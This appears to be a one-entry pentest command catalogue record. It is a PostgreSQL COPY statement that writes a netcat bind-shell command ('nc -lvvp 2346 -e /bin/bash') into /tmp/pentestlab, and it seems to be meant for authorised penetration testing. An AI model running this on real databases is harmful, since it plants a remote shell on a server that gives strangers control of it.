---
id: a063495a-a056-463a-bc9c-82bf3e094fc4
name: Copy command to file
type: command
executor: bash
data: COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
output: null
created_at: '2023-04-06T03:56:35.993295+00:00'
updated_at: '2023-04-10T20:23:17.646217+00:00'
---

# Copy command to file

```bash
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```


